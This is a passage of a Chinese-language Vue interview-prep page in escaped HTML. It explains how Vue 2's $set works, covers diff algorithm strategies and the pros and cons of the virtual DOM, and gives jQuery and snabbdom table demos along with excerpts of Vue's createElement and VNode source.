1.是开发环境 target 没定义或者是基础类型则报错\\n  if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp;\\n    (isUndef(target) || isPrimitive(target))\\n  ) {\\n    warn(`Cannot set reactive property on undefined, null, or primitive value: ${(target: any)}`)\\n  }\\n  // 2.如果是数组 Vue.set(array,1,100); 调用我们重写的splice方法 (这样可以更新视图)\\n  if (Array.isArray(target) &amp;&amp; isValidArrayIndex(key)) {\\n    target.length = Math.max(target.length, key)\\n    // 利用数组的splice变异方法触发响应式  \\n    target.splice(key, 1, val)\\n    return val\\n  }\\n  // 3.如果是对象本身的属性，则直接添加即可\\n  if (key in target &amp;&amp; !(key in Object.prototype)) {\\n    target[key] = val // 直接修改属性值  \\n    return val\\n  }\\n  // 4.如果是Vue实例 或 根数据data时 报错,（更新_data 无意义）\\n  const ob = (target: any).__ob__\\n  if (target._isVue || (ob &amp;&amp; ob.vmCount)) {\\n    process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; warn(\\n      &#39;Avoid adding reactive properties to a Vue instance or its root $data &#39; +\\n      &#39;at runtime - declare it upfront in the data option.&#39;\\n    )\\n    return val\\n  }\\n  // 5.如果不是响应式的也不需要将其定义成响应式属性\\n  if (!ob) {\\n    target[key] = val\\n    return val\\n  }\\n  // 6.将属性定义成响应式的\\n  defineReactive(ob.value, key, val)\\n  // 通知视图更新\\n  ob.dep.notify()\\n  return val\\n}\\n</code></pre>\\n<p><strong>我们阅读以上源码可知，vm.$set 的实现原理是：</strong></p>\\n<ul>\\n<li><strong>如果目标是数组</strong>，直接使用数组的 <code>splice</code> 方法触发响应式；</li>\\n<li><strong>如果目标是对象</strong>，会先判读属性是否存在、对象是否是响应式，最终如果要对属性进行响应式处理，则是通过调用 <code>defineReactive</code> 方法进行响应式处理（ <code>defineReactive</code> 方法就是 <code>Vue</code> 在初始化对象时，给对象属性采用 <code>Object.defineProperty</code> 动态添加 <code>getter</code> 和 <code>setter</code> 的功能所调用的方法）</li>\\n</ul>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong><code>Vue</code> 2 用户页执行 <code>vm.user.age = 20</code> 后控制台值正确，模板却不更新；为什么直接赋值失效，而 <code>vm.$set(vm.user, \'age\', 20)</code> 有效？</strong></p>\\n<p><code>age</code> 初始化时不存在，<code>Vue</code> 2 基于 <code>Object.defineProperty</code>，无法拦截这种对象属性新增。<code>$set</code> 会调用 <code>defineReactive</code> 为新属性建立 <code>getter</code>、<code>setter</code>，再通过对象自身的 <code>ob.dep.notify()</code> 通知依赖更新；目标必须是已观测对象才有这套通知链路。</p>\\n</li>\\n<li>\\n<p><strong>购物车执行 <code>items[3] = newItem</code> 后行内容没变，改成 <code>Vue.set(items, 3, newItem)</code> 就恢复了；数组分支内部做了什么？</strong></p>\\n<p><code>Vue</code> 2 的数组下标赋值无法被现有拦截机制可靠检测，因此 <code>Vue.set</code> 对合法索引会转为调用被增强过的 <code>splice</code>。该变异方法能够触发数组依赖更新，并会按需要调整数组长度；直接改索引则绕开了这条通知路径。</p>\\n</li>\\n<li>\\n<p><strong>工具函数收到一个未被 <code>Vue</code> 观测的普通对象，调用 <code>Vue.set(raw, \'status\', 1)</code>；它会把整个对象自动变成响应式吗？</strong></p>\\n<p>不会，源码发现目标没有 <code>__ob__</code> 时只执行普通属性赋值并返回，不会把整个对象递归改造成响应式对象。应先让该对象进入 <code>Vue</code> 2 的响应式数据树；否则即使 <code>API</code> 名为 <code>set</code>，也没有可通知的 <code>dep</code> 和 <code>watcher</code>。</p>\\n</li>\\n<li>\\n<p><strong>同事想在运行时执行 <code>Vue.set(vm.$data, \'featureFlag\', true)</code>，让十几个页面立刻使用新根字段；为什么框架会阻止？</strong></p>\\n<p><code>Vue</code> 2 会识别 <code>Vue</code> 实例或根级 <code>$data</code>，发出警告并拒绝把新字段动态转成响应式属性。根数据在初始化阶段已经完成观测及实例代理，运行时补字段不属于支持路径；应在 <code>data</code> 中预先声明，哪怕初值只是 <code>null</code>。</p>\\n</li>\\n<li>\\n<p><strong>迁移到 <code>Vue</code> 3 后，评审里仍有人用 <code>Vue.set(list, 1, value)</code>；该保留兼容封装还是直接删除？</strong></p>\\n<p>如果代码已经完全运行在 <code>Vue</code> 3，应删除这类调用并直接使用对象新增、数组索引或长度赋值，因为 <code>Proxy</code> 能拦截这些操作，<code>Vue.set</code> 也已移除。若项目仍同时承载 <code>Vue</code> 2，则兼容层可以暂留，但要明确版本边界，避免把历史限制带入新代码。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_16-vue-diff算法相关问题\\"><a class=\\"header-anchor\\" href=\\"#_16-vue-diff算法相关问题\\">#</a> 16 Vue diff算法相关问题</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>前提是两条策略：<strong>同层比较</strong>（不做跨层级移动，复杂度从 <code>O(n³)</code> 降到 <code>O(n)</code>）、<strong>类型不同直接替换整棵子树</strong></li>\\n<li><code>Vue 2</code> 用<strong>双端 diff</strong>：新旧列表各设头尾指针，四种组合依次尝试，都不中才建 key 索引表查找</li>\\n<li><code>Vue 3</code> 换成<strong>最长递增子序列</strong>：先处理头尾相同的部分，中间乱序区求 <code>LIS</code>，不在序列里的才移动，移动次数最少</li>\\n<li><code>key</code> 必须是<strong>稳定且唯一的业务 id</strong>：用下标会导致插入/排序时判定错误，用随机数会导致整列表销毁重建</li>\\n<li><code>Vue 3</code> 更大的提速来自编译期的静态提升和 <code>PatchFlag</code>——大部分节点根本不进 diff</li>\\n</ul>\\n<p><strong><code>Vue</code> 的 <code>diff</code> 核心是同层比较，节点类型不同时直接替换整棵子树。</strong> <code>Vue 2</code> 对列表采用双端比较，头尾组合都匹配不到时再按 <code>key</code> 查找；<code>Vue 3</code> 则处理完相同头尾后，用最长递增子序列减少中间节点移动。<code>key</code> 应使用稳定且唯一的业务标识，下标在插入或排序时容易复用错误，随机值又会造成整列重建。实际优化中，<code>Vue 3</code> 的静态提升和 <code>PatchFlag</code> 还能让大量节点不进入 <code>diff</code>。</p>\\n</section>\\n<h3 id=\\"vue为什么需要虚拟dom-优缺点有哪些\\"><a class=\\"header-anchor\\" href=\\"#vue为什么需要虚拟dom-优缺点有哪些\\">#</a> Vue为什么需要虚拟DOM？优缺点有哪些</h3>\\n<blockquote>\\n<p>由于在浏览器中操作 <code>DOM</code> 是很昂贵的。频繁的操作 <code>DOM</code>，会产生一定的性能问题。这就是虚拟 <code>Dom</code> 的产生原因。<code>Vue2</code> 的 <code>Virtual DOM</code> 借鉴了开源库 <code>snabbdom</code> 的实现。<code>Virtual DOM</code> 本质就是用一个原生的 <code>JS</code> 对象去描述一个 <code>DOM</code> 节点，是对真实 <code>DOM</code> 的一层抽象</p>\\n</blockquote>\\n<p><strong>优点：</strong></p>\\n<ul>\\n<li><strong>保证性能下限</strong>： 框架的虚拟 <code>DOM</code> 需要适配任何上层 <code>API</code> 可能产生的操作，它的一些 <code>DOM</code> 操作的实现必须是普适的，所以它的性能并不是最优的；但是比起粗暴的 <code>DOM</code> 操作性能要好很多，因此框架的虚拟 <code>DOM</code> 至少可以保证在你不需要手动优化的情况下，依然可以提供还不错的性能，即保证性能的下限；</li>\\n<li><strong>无需手动操作 DOM</strong>： 我们不再需要手动去操作 <code>DOM</code>，只需要写好 <code>View-Model</code> 的代码逻辑，框架会根据虚拟 <code>DOM</code> 和 数据双向绑定，帮我们以可预期的方式更新视图，极大提高我们的开发效率；</li>\\n<li><strong>跨平台</strong>： 虚拟 <code>DOM</code> 本质上是 <code>JavaScript</code> 对象,而 <code>DOM</code> 与平台强相关，相比之下虚拟 <code>DOM</code> 可以进行更方便地跨平台操作，例如服务器渲染、<code>weex</code> 开发等等。</li>\\n</ul>\\n<p><strong>缺点:</strong></p>\\n<ul>\\n<li>无法进行极致优化：虽然虚拟 <code>DOM</code> + 合理的优化，足以应对绝大部分应用的性能需求，但在一些性能要求极高的应用中虚拟 <code>DOM</code> 无法进行针对性的极致优化。</li>\\n<li>首次渲染大量<code>DOM</code>时，由于多了一层虚拟 <code>DOM</code> 的计算，会比 <code>innerHTML</code> 插入慢。</li>\\n</ul>\\n<p><strong>虚拟 DOM 实现原理？</strong></p>\\n<p>虚拟 <code>DOM</code> 的实现原理主要包括以下 <code>3</code> 部分：</p>\\n<ul>\\n<li>用 <code>JavaScript</code> 对象模拟真实 <code>DOM</code> 树，对真实 <code>DOM</code> 进行抽象；</li>\\n<li><code>diff</code> 算法 — 比较两棵虚拟 <code>DOM</code> 树的差异；</li>\\n<li><code>pach</code> 算法 — 将两个虚拟 <code>DOM</code> 对象的差异应用到真正的 <code>DOM</code> 树。</li>\\n</ul>\\n<div class=\\"tip\\">\\n<p><strong>思路</strong></p>\\n<ul>\\n<li><code>vdom</code>是什么</li>\\n<li>引入<code>vdom</code>的好处</li>\\n<li><code>vdom</code>如何生成，又如何成为<code>dom</code></li>\\n<li>在后续的<code>diff</code>中的作用</li>\\n</ul>\\n<p><strong>回答范例</strong></p>\\n<ol>\\n<li>虚拟<code>dom</code>顾名思义就是虚拟的<code>dom</code>对象，它本身就是一个 <code>JavaScript</code> 对象，只不过它是通过不同的属性去描述一个视图结构</li>\\n<li>通过引入<code>vdom</code>我们可以获得如下好处：</li>\\n</ol>\\n<ul>\\n<li><strong>将真实元素节点抽象成 <code>VNode</code>，有效减少直接操作 <code>dom</code> 次数，从而提高程序性能</strong>\\n<ul>\\n<li>直接操作 <code>dom</code> 是有限制的，比如：<code>diff</code>、<code>clone</code> 等操作，一个真实元素上有许多的内容，如果直接对其进行 <code>diff</code> 操作，会去额外 <code>diff</code> 一些没有必要的内容；同样的，如果需要进行 <code>clone</code> 那么需要将其全部内容进行复制，这也是没必要的。但是，如果将这些操作转移到 <code>JavaScript</code> 对象上，那么就会变得简单了</li>\\n<li>操作 <code>dom</code> 是比较昂贵的操作，频繁的<code>dom</code>操作容易引起页面的重绘和回流，但是通过抽象 <code>VNode</code> 进行中间处理，可以有效减少直接操作<code>dom</code>的次数，从而减少页面重绘和回流</li>\\n</ul>\\n</li>\\n<li><strong>方便实现跨平台</strong>\\n<ul>\\n<li>同一 <code>VNode</code> 节点可以渲染成不同平台上的对应的内容，比如：渲染在浏览器是 <code>dom</code> 元素节点，渲染在 <code>Native( iOS、Android)</code>变为对应的控件、可以实现 <code>SSR</code> 、渲染到 <code>WebGL</code> 中等等</li>\\n<li><code>Vue3</code> 中允许开发者基于 <code>VNode</code> 实现自定义渲染器（<code>renderer</code>），以便于针对不同平台进行渲染</li>\\n</ul>\\n</li>\\n</ul>\\n<ol start=\\"3\\">\\n<li><code>vdom</code>如何生成？在vue中我们常常会为组件编写模板 - <code>template</code>， 这个模板会被编译器 - <code>compiler</code>编译为渲染函数，在接下来的挂载（<code>mount</code>）过程中会调用<code>render</code>函数，返回的对象就是虚拟<code>dom</code>。但它们还不是真正的<code>dom</code>，所以会在后续的<code>patch</code>过程中进一步转化为<code>dom</code>。</li>\\n</ol>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/8154cc1efc0aea96.png\\" alt=\\"\\"></p>\\n<ol start=\\"4\\">\\n<li>挂载过程结束后，<code>vue</code>程序进入更新流程。如果某些响应式数据发生变化，将会引起组件重新<code>render</code>，此时就会生成新的<code>vdom</code>，和上一次的渲染结果<code>diff</code>就能得到变化的地方，从而转换为最小量的<code>dom</code>操作，高效更新视图</li>\\n</ol>\\n</div>\\n<p><strong>为什么要用vdom？案例解析</strong></p>\\n<p>现在有一个场景，实现以下需求:</p>\\n<pre class=\\"language-js\\"><code>[    \\n  { name: &quot;张三&quot;, age: &quot;20&quot;, address: &quot;北京&quot;},    \\n  { name: &quot;李四&quot;, age: &quot;21&quot;, address: &quot;武汉&quot;},    \\n  { name: &quot;王五&quot;, age: &quot;22&quot;, address: &quot;杭州&quot;},\\n]\\n</code></pre>\\n<p>将该数据展示成一个表格，并且随便修改一个信息，表格也跟着修改。 用jQuery实现如下:</p>\\n<pre class=\\"language-html\\"><code>&lt;!DOCTYPE html&gt;\\n&lt;html lang=&quot;en&quot;&gt;\\n&lt;head&gt;\\n  &lt;meta charset=&quot;UTF-8&quot;&gt;\\n  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\\n  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;\\n  &lt;title&gt;Document&lt;/title&gt;\\n&lt;/head&gt;\\n\\n&lt;body&gt;\\n  &lt;div id=&quot;container&quot;&gt;&lt;/div&gt;\\n  &lt;button id=&quot;btn-change&quot;&gt;改变&lt;/button&gt;\\n\\n  &lt;script src=&quot;https://cdn.bootcss.com/jquery/3.2.0/jquery.js&quot;&gt;&lt;/script&gt;\\n  &lt;script&gt;\\n    const data = [{\\n        name: &quot;张三&quot;,\\n        age: &quot;20&quot;,\\n        address: &quot;北京&quot;\\n      },\\n      {\\n        name: &quot;李四&quot;,\\n        age: &quot;21&quot;,\\n        address: &quot;武汉&quot;\\n      },\\n      {\\n        name: &quot;王五&quot;,\\n        age: &quot;22&quot;,\\n        address: &quot;杭州&quot;\\n      },\\n    ];\\n    //渲染函数\\n    function render(data) {\\n      const $container = $(&#39;#container&#39;);\\n      $container.html(&#39;&#39;);\\n      const $table = $(&#39;&lt;table&gt;&#39;);\\n      // 重绘一次\\n      $table.append($(&#39;&lt;tr&gt;&lt;td&gt;name&lt;/td&gt;&lt;td&gt;age&lt;/td&gt;&lt;td&gt;address&lt;/td&gt;&lt;/tr&gt;&#39;));\\n      data.forEach(item =&gt; {\\n        //每次进入都重绘\\n        $table.append($(`&lt;tr&gt;&lt;td&gt;${item.name}&lt;/td&gt;&lt;td&gt;${item.age}&lt;/td&gt;&lt;td&gt;${item.address}&lt;/td&gt;&lt;/tr&gt;`))\\n      })\\n      $container.append($table);\\n    }\\n    \\n    $(&#39;#btn-change&#39;).click(function () {\\n      data[1].age = 30;\\n      data[2].address = &#39;深圳&#39;;\\n      render(data);\\n    });\\n  &lt;/script&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n</code></pre>\\n<ul>\\n<li>这样点击按钮，会有相应的视图变化，但是你审查以下元素，每次改动之后，<code>table</code>标签都得重新创建，也就是说<code>table</code>下面的每一个栏目，不管是数据是否和原来一样，都得重新渲染，这并不是理想中的情况，当其中的一栏数据和原来一样，我们希望这一栏不要重新渲染，因为<code>DOM</code>重绘相当消耗浏览器性能。</li>\\n<li>因此我们采用JS对象模拟的方法，将<code>DOM</code>的比对操作放在<code>JS</code>层，减少浏览器不必要的重绘，提高效率。</li>\\n<li>当然有人说虚拟DOM并不比真实的<code>DOM</code>快，其实也是有道理的。当上述<code>table</code>中的每一条数据都改变时，显然真实的<code>DOM</code>操作更快，因为虚拟<code>DOM</code>还存在<code>js</code>中<code>diff</code>算法的比对过程。所以，上述性能优势仅仅适用于大量数据的渲染并且改变的数据只是一小部分的情况。</li>\\n</ul>\\n<p>如下<code>DOM</code>结构:</p>\\n<pre class=\\"language-html\\"><code>&lt;ul id=&quot;list&quot;&gt;\\n    &lt;li class=&quot;item&quot;&gt;Item1&lt;/li&gt;\\n    &lt;li class=&quot;item&quot;&gt;Item2&lt;/li&gt;\\n&lt;/ul&gt;\\n</code></pre>\\n<p>映射成虚拟<code>DOM</code>就是这样:</p>\\n<pre class=\\"language-js\\"><code>{\\n  tag: &quot;ul&quot;,\\n  attrs: {\\n    id:&amp;emsp;&quot;list&quot;\\n  },\\n  children: [\\n    {\\n      tag: &quot;li&quot;,\\n      attrs: { className: &quot;item&quot; },\\n      children: [&quot;Item1&quot;]\\n    }, {\\n      tag: &quot;li&quot;,\\n      attrs: { className: &quot;item&quot; },\\n      children: [&quot;Item2&quot;]\\n    }\\n  ]\\n} \\n</code></pre>\\n<p><strong>使用snabbdom实现vdom</strong></p>\\n<blockquote>\\n<p>这是一个简易的实现<code>vdom</code>功能的库，相比<code>vue</code>、<code>react</code>，对于<code>vdom</code>这块更加简易，适合我们学习<code>vdom</code>。<code>vdom</code>里面有两个核心的<code>api</code>，一个是<code>h</code>函数，一个是<code>patch</code>函数，前者用来生成<code>vdom</code>对象，后者的功能在于做虚拟<code>dom</code>的比对和将<code>vdom</code>挂载到真实<code>DOM</code>上</p>\\n</blockquote>\\n<p>简单介绍一下这两个函数的用法:</p>\\n<pre class=\\"language-js\\"><code>h(&#39;标签名&#39;, {属性}, [子元素])\\nh(&#39;标签名&#39;, {属性}, [文本])\\npatch(container, vnode) // container为容器DOM元素\\npatch(vnode, newVnode)\\n</code></pre>\\n<p>现在我们就来用<code>snabbdom</code>重写一下刚才的例子:</p>\\n<pre class=\\"language-html\\"><code>&lt;!DOCTYPE html&gt;\\n&lt;html lang=&quot;en&quot;&gt;\\n&lt;head&gt;\\n  &lt;meta charset=&quot;UTF-8&quot;&gt;\\n  &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;\\n  &lt;meta http-equiv=&quot;X-UA-Compatible&quot; content=&quot;ie=edge&quot;&gt;\\n  &lt;title&gt;Document&lt;/title&gt;\\n&lt;/head&gt;\\n&lt;body&gt;\\n  &lt;div id=&quot;container&quot;&gt;&lt;/div&gt;\\n  &lt;button id=&quot;btn-change&quot;&gt;改变&lt;/button&gt;\\n  &lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/snabbdom.js&quot;&gt;&lt;/script&gt;\\n  &lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/snabbdom-class.js&quot;&gt;&lt;/script&gt;\\n  &lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/snabbdom-props.js&quot;&gt;&lt;/script&gt;\\n  &lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/snabbdom-style.js&quot;&gt;&lt;/script&gt;\\n  &lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/snabbdom-eventlisteners.min.js&quot;&gt;&lt;/script&gt;\\n  &lt;script src=&quot;https://cdn.bootcss.com/snabbdom/0.7.3/h.js&quot;&gt;&lt;/script&gt;\\n  &lt;script&gt;\\n    let snabbdom = window.snabbdom;\\n\\n    // 定义patch\\n    let patch = snabbdom.init([\\n      snabbdom_class,\\n      snabbdom_props,\\n      snabbdom_style,\\n      snabbdom_eventlisteners\\n    ]);\\n\\n    //定义h\\n    let h = snabbdom.h;\\n\\n    const data = [{\\n        name: &quot;张三&quot;,\\n        age: &quot;20&quot;,\\n        address: &quot;北京&quot;\\n      },\\n      {\\n        name: &quot;李四&quot;,\\n        age: &quot;21&quot;,\\n        address: &quot;武汉&quot;\\n      },\\n      {\\n        name: &quot;王五&quot;,\\n        age: &quot;22&quot;,\\n        address: &quot;杭州&quot;\\n      },\\n    ];\\n    data.unshift({name: &quot;姓名&quot;, age: &quot;年龄&quot;, address: &quot;地址&quot;});\\n\\n    let container = document.getElementById(&#39;container&#39;);\\n    let vnode;\\n    const render = (data) =&gt; {\\n      let newVnode = h(&#39;table&#39;, {}, data.map(item =&gt; { \\n        let tds = [];\\n        for(let i in item) {\\n          if(item.hasOwnProperty(i)) {\\n            tds.push(h(&#39;td&#39;, {}, item[i] + &#39;&#39;));\\n          }\\n        }\\n        return h(&#39;tr&#39;, {}, tds);\\n      }));\\n\\n      if(vnode) {\\n          patch(vnode, newVnode);\\n      } else {\\n          patch(container, newVnode);\\n      }\\n      vnode = newVnode;\\n    }\\n\\n    render(data);\\n\\n    let btnChnage = document.getElementById(&#39;btn-change&#39;);\\n    btnChnage.addEventListener(&#39;click&#39;, function() {\\n      data[1].age = 30;\\n      data[2].address = &quot;深圳&quot;;\\n      //re-render\\n      render(data);\\n    })\\n  &lt;/script&gt;\\n&lt;/body&gt;\\n&lt;/html&gt;\\n</code></pre>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/08/8599e34fabc9a45f.gif\\" alt=\\"\\"></p>\\n<p>你会发现，<strong>只有改变的栏目才闪烁，也就是进行重绘</strong>，数据没有改变的栏目还是保持原样，这样就大大节省了浏览器重新渲染的开销</p>\\n<blockquote>\\n<p>vue中使用<code>h函数</code>生成虚拟<code>DOM</code>返回</p>\\n</blockquote>\\n<pre class=\\"language-js\\"><code>const vm = new Vue({\\n  el: &#39;#app&#39;,\\n  data: {\\n    user: {name:&#39;poetry&#39;}\\n  },\\n  render(h){\\n    // h()\\n    // h(App)\\n    // h(&#39;div&#39;,[])\\n    let vnode = h(&#39;div&#39;,{},&#39;hello world&#39;);\\n    return vnode\\n  }\\n});\\n</code></pre>\\n<p>&lt;details&gt;&lt;summary&gt;&lt;b&gt;相关源码&lt;/b&gt;&lt;/summary&gt;</p>\\n<pre class=\\"language-js\\"><code>// src/core/vdom/create-element.js \\n\\nexport function createElement ( // 创建元素\\n  context: Component,\\n  tag: any,\\n  data: any,\\n  children: any,\\n  normalizationType: any,\\n  alwaysNormalize: boolean\\n): VNode | Array&lt;VNode&gt; {\\n  if (Array.isArray(data) || isPrimitive(data)) {\\n    normalizationType = children\\n    children = data\\n    data = undefined\\n  }\\n  if (isTrue(alwaysNormalize)) {\\n    normalizationType = ALWAYS_NORMALIZE\\n  }\\n  // 创建元素\\n  return _createElement(context, tag, data, children, normalizationType)\\n}\\n\\nexport function _createElement (\\n  context: Component,\\n  tag?: string | Class&lt;Component&gt; | Function | Object,\\n  data?: VNodeData,\\n  children?: any,\\n  normalizationType?: number\\n): VNode | Array&lt;VNode&gt; {\\n  if (isDef(data) &amp;&amp; isDef((data: any).__ob__)) {\\n    process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; warn(\\n      `Avoid using observed data object as vnode data: ${JSON.stringify(data)}\\\\n` +\\n      &#39;Always create fresh vnode data objects in each render!&#39;,\\n      context\\n    )\\n    return createEmptyVNode()\\n  }\\n  // object syntax in v-bind\\n  if (isDef(data) &amp;&amp; isDef(data.is)) {\\n    tag = data.is\\n  }\\n  if (!tag) { // 如果 h() 返回空节点\\n    // in case of component :is set to falsy value\\n    return createEmptyVNode()\\n  }\\n  // warn against non-primitive key\\n  if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp;\\n    isDef(data) &amp;&amp; isDef(data.key) &amp;&amp; !isPrimitive(data.key)\\n  ) {\\n    if (!__WEEX__ || !(&#39;@binding&#39; in data.key)) {\\n      warn(\\n        &#39;Avoid using non-primitive value as key, &#39; +\\n        &#39;use string/number value instead.&#39;,\\n        context\\n      )\\n    }\\n  }\\n  // support single function children as default scoped slot\\n  if (Array.isArray(children) &amp;&amp;\\n    typeof children[0] === &#39;function&#39;\\n  ) {\\n    data = data || {}\\n    data.scopedSlots = { default: children[0] }\\n    children.length = 0\\n  }\\n  if (normalizationType === ALWAYS_NORMALIZE) { //  处理儿子节点个数\\n    children = normalizeChildren(children)\\n  } else if (normalizationType === SIMPLE_NORMALIZE) {\\n    children = simpleNormalizeChildren(children)\\n  } \\n  let vnode, ns\\n  if (typeof tag === &#39;string&#39;) { // 标签是字符串\\n    let Ctor\\n    ns = (context.$vnode &amp;&amp; context.$vnode.ns) || config.getTagNamespace(tag)\\n    if (config.isReservedTag(tag)) {\\n      // platform built-in elements\\n      if (process.env.NODE_ENV !== &#39;production&#39; &amp;&amp; isDef(data) &amp;&amp; isDef(data.nativeOn)) {\\n        warn(\\n          `The .native modifier for v-on is only valid on components but it was used on &lt;${tag}&gt;.`,\\n          context\\n        )\\n      }\\n      vnode = new VNode(\\n        config.parsePlatformTagName(tag), data, children,\\n        undefined, undefined, context\\n      )\\n    } else if ((!data || !data.pre) &amp;&amp; isDef(Ctor = resolveAsset(context.$options, &#39;components&#39;, tag))) {\\n      // component  组件的虚拟节点\\n      vnode = createComponent(Ctor, data, context, children, tag)\\n    } else {\\n      // unknown or unlisted namespaced elements\\n      // check at runtime because it may get assigned a namespace when its\\n      // parent normalizes children\\n      vnode = new VNode(\\n        tag, data, children,\\n        undefined, undefined, context\\n      )\\n    }\\n  } else {\\n    // direct component options / constructor  组件的虚拟节点\\n    vnode = createComponent(tag, data, context, children)\\n  }\\n  if (Array.isArray(vnode)) {\\n    return vnode\\n  } else if (isDef(vnode)) {\\n    if (isDef(ns)) applyNS(vnode, ns)\\n    if (isDef(data)) registerDeepBindings(data)\\n    return vnode\\n  } else {\\n    return createEmptyVNode()\\n  }\\n}\\n\\nfunction applyNS (vnode, ns, force) {\\n  vnode.ns = ns\\n  if (vnode.tag === &#39;foreignObject&#39;) {\\n    // use default namespace inside foreignObject\\n    ns = undefined\\n    force = true\\n  }\\n  if (isDef(vnode.children)) {\\n    for (let i = 0, l = vnode.children.length; i &lt; l; i++) {\\n      const child = vnode.children[i]\\n      if (isDef(child.tag) &amp;&amp; (\\n        isUndef(child.ns) || (isTrue(force) &amp;&amp; child.tag !== &#39;svg&#39;))) {\\n        applyNS(child, ns, force)\\n      }\\n    }\\n  }\\n}\\n\\n// ref #5318\\n// necessary to ensure parent re-render when deep bindings like :style and\\n// :class are used on slot nodes\\nfunction registerDeepBindings (data) {\\n  if (isObject(data.style)) {\\n    traverse(data.style)\\n  }\\n  if (isObject(data.class)) {\\n    traverse(data.class)\\n  }\\n}\\n</code></pre>\\n<pre class=\\"language-js\\"><code>// 虚拟节点的实现 src/core/vdom/vnode.js\\n\\nexport default class VNode {\\n  tag: string | void;\\n  data: VNodeData | void;\\n  children: ?Array&lt;VNode&gt;;\\n  text: string | void;\\n  elm: Node | void;\\n  ns: string | void;\\n  context: Component | void; // rendered in this component&#39;s scope\\n  key: string | number | void;\\n  componentOptions: VNodeComponentOptions | void;\\n  componentInstance: Component | void; // component instance\\n  parent: VNode | void; // component placeholder node\\n\\n  // strictly internal\\n  raw: boolean; // contains raw HTML? (server only)\\n  isStatic: boolean; // hoisted static node\\n  isRootInsert: boolean; // necessary for enter transition check\\n  isComment: boolean; // empty comment placeholder?\\n  isCloned: boolean; // is a cloned node?\\n  isOnce: boolean; // is a v-once node?\\n  asyncFactory: Function | void; // async component factory function\\n  asyncMeta: Object | void;\\n  isAsyncPlaceholder: boolean;\\n  ssrContext: Object | void;\\n  fnContext: Component | void; // real context vm for functional nodes\\n  fnOptions: ?ComponentOptions; // for SSR caching\\n  devtoolsMeta: ?Object; // used to store functional render context for devtools\\n  fnScopeId: ?string; // functional scope id support\\n\\n  constructor (\\n    tag?: string,\\n    data?: VNodeData,\\n    children?: ?Array&lt;VNode&gt;,\\n    text?: string,\\n    elm?: Node,\\n    context?: Component,\\n    componentOptions?: VNodeComponentOptions,\\n    asyncFactory?: Function\\n  ) {\\n    this.tag = tag\\n    this.data = data\\n    this.children = children\\n    this.text = text\\n    this.elm = elm\\n    this.ns = undefined\\n    this.context = context\\n    this.fnContext = undefined\\n    this.fnOptions = undefined\\n    this.fnScopeId = undefined\\n    this.key = data &amp;&amp; data.key\\n    this.componentOptions = componentOptions\\n    this.componentInstance = undefined\\n    this.parent = undefined\\n    this.raw = false\\n    this.isStatic = false\\n    this.isRootInsert = true\\n    this.isComment = false\\n    this.isCloned = false\\n    this.isOnce = false\\n    this.asyncFactory = asyncFactory\\n    this.asyncMeta = undefined\\n    this.isAsyncPlaceholder = false\\n  }\\n\\n  // DEPRECATED: alias for componentInstance for backwards compat.\\n  /* istanbul ignore next */\\n  get child (): Component | void {\\n    return this.componentInstance\\n  }\\n}\\n\\nexport const createEmptyVNode = (text: string = &#39;&#39;) =&gt; {\\n  const node = new VNode()\\n  node.text = text\\n  node.isComment = true\\n  return node\\n}\\n\\nexport function createTextVNode (val: string | number) {\\n  return new VNode(undefined, undefined, undefined, String(val))\\n}\\n\\n// optimized shallow clone\\n// used for static nodes and slot nodes because they may be reused across\\n// multiple renders, cloning them avoids errors when DOM manipulations rely\\n// on their elm reference.\\nexport function cloneVNode (vnode: VNode): VNode {\\n  const cloned = new VNode(\\n    vnode.tag,\\n    vnode.data,\\n    // #7975\\n    // clone children array to avoid mutating original in case of cloning\\n    // a child.\\n    vnode.children &amp;&amp; vnode.children.slice(),\\n    vnode.text,\\n    vnode.elm,\\n    vnode.context,\\n    vnode.componentOptions,\\n    vnode.asyncFactory\\n  )\\n  cloned.ns = vnode.ns\\n  cloned.isStatic = vnode.isStatic\\n  cloned.key = vnode.key\\n  cloned.isComment = vnode.isComment\\n  cloned.fnContext = vnode.fnContext\\n  cloned.fnOptions = vnode.fnOptions\\n  cloned.fnScopeId = vnode.fnScopeId\\n  cloned.asyncMeta = vnode.asyncMeta\\n  cloned.isCloned = true\\n  return cloned\\n}\\n</code></pre>\\n<h3 id=\\"vue中diff算法原理\\"><a class=\\"header-anchor\\" href=\\"#vue中diff算法原理\\">#</a> Vue中diff算法原理</h3>\\n<p><code>DOM</code>操作是非常昂贵的，因此我们需要尽量地减少<code>DOM</code>操作。这就需要找出本次<code>DOM</code>必须更新的节点来更新，其他的不更新，这个找出的过程，就需要应用diff算法</p>\\n<blockquote>\\n<p><code>vue</code>的<code>diff</code>算法是平级比较，不考虑跨级比较的情况。内部采用<code>深度递归的方式+双指针(头尾都加指针)</code>的方式进行比较。</p>\\n</blockquote>\\n<div 